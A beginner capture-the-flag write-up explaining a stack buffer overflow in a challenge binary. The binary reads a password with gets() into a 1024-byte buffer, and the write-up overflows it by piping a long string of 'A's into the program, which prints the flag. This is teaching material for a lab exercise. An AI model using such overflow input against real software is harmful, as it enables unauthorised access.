# Are you a 1 or a 0?

This challenge introduces us to the concept of buffer overflow. Almost all beginner CTF's invlove atleast one question or a variant involving this concept. You can read more about it [here](https://ctf101.org/binary-exploitation/buffer-overflow/).

On trying to run the binary file, we are asked for a password. For incorrect attempts, we get :

```
>>> ./self_destruct_initiator


Enter Super Secret Password:

────▄▄▀▀▀▀▀▀▀▀▀▀▀▀▄▄▄▄
──▄▀░░░░░░░░░░░░░░░░░░▀▄
──█░░░░░░░░░░░░░░░░░░░░░▀▄
─█░░░░░░░░░▄▄▀▀▀▀▀▀▀▄▄▄▄░░█
▐▌░░░░░░▄▄▄▄▀▀▀▀▀▀▀▄▄▄▄░░░▐▌
█░░░░░░░░░▄▄▀▀▀▀▀░░░░░▀▀▀▄░█
█░░░░░░░░░░░░░░░░▀░░░▐░░░░░▐▌
▐▌░░░░░░░░░▐▀▀██▄░░░░░░▄▄▄░▐▌
─█░░░░░░░░░░░▀▀▀░░░░░░▀▀██░░█
─▐▌░░░░▄░░░░░░░░░░░░░▌░░░░░░█
──▐▌░░▐░░░░░░░░░░░░░░▀▄░░░░░█
───█░░░▌░░░░░░░░▐▀░░░░▄▀░░░▐▌
───▐▌░░▀▄░░░░░░░░▀░▀░▀▀░░░▄▀
───▐▌░░▐▀▄░░░░░░░░░░░░░░░░█
───▐▌░░░▌░▀▄░░░▄▀▀▀▀▀▀▄░░█
───█░░░▀░░░░▀▄░░░░░░░░░░▄▀
──▐▌░░░░░░░░░░▀▄░░░░░░▄▀
─▄▀░░░▄▀░░░░▀▄░░▀▀▀▀█▀
▀░░░▄▀░░░░▀▄▀░░░░░░░▀▀▀▀▄▄▄▄▄


>TFW no flag
```

Once again we need to find the password. Or do we?

Lets have a look at this part of the source code provided to us :

```c
int main(int argc, char **argv)
{
  volatile int security_check;
  printf("Enter Super Secret Password:");
  char password[1024];

  security_check = 0;
  gets(password);
```


The noticeable stuff here, is that the function uses the gets(). gets() is a very vulnerable function, and is now replaced by fgets() in C language. The problem with gets is that the function does'nt know about the buffer and continues reading till the EOF(end of file).
The first computer virus(The Morris Worm) exploited this. 

Moving to our challenge, we can see in the source code, the buffer size for the string, and we simply pass a string greater in size than that, causing it to to overflow.
You can do this by :

```
>>>echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | ./self_destruct_initiator



Enter Super Secret Password:Oh no!! You've done it you Dastardly, Dashing, Devil boy you!!
██████╗ ██╗████████╗███████╗ ██████╗████████╗███████╗ ██████╗  ██████╗  ██████╗ ██████╗ ██████╗ ██╗   ██╗██████╗          ██████╗ ██╗     ██████╗         ███████╗██████╗  ██╗██████╗ ███╗   ██╗██████╗
██╔══██╗██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔════╝ ██╔═████╗██╔═████╗██╔══██╗██╔══██╗╚██╗ ██╔╝╚════██╗        ██╔═████╗██║     ██╔══██╗        ██╔════╝██╔══██╗███║╚════██╗████╗  ██║██╔══██╗
██████╔╝██║   ██║   ███████╗██║        ██║   █████╗  ██║  ███╗██║██╔██║██║██╔██║██║  ██║██████╔╝ ╚████╔╝  █████╔╝        ██║██╔██║██║     ██║  ██║        █████╗  ██████╔╝╚██║ █████╔╝██╔██╗ ██║██║  ██║
██╔══██╗██║   ██║   ╚════██║██║        ██║   ██╔══╝  ██║   ██║████╔╝██║████╔╝██║██║  ██║██╔══██╗  ╚██╔╝   ╚═══██╗        ████╔╝██║██║     ██║  ██║        ██╔══╝  ██╔══██╗ ██║ ╚═══██╗██║╚██╗██║██║  ██║
██████╔╝██║   ██║   ███████║╚██████╗   ██║   ██║     ╚██████╔╝╚██████╔╝╚██████╔╝██████╔╝██████╔╝   ██║   ██████╔╝███████╗╚██████╔╝███████╗██████╔╝███████╗██║     ██║  ██║ ██║██████╔╝██║ ╚████║██████╔╝
╚═════╝ ╚═╝   ╚═╝   ╚══════╝ ╚═════╝   ╚═╝   ╚═╝      ╚═════╝  ╚═════╝  ╚═════╝ ╚═════╝ ╚═════╝    ╚═╝   ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═╝╚═════╝ ╚═╝  ╚═══╝╚═════╝
```

And well it seems we did it. We dastardly dashing devil men(or women).
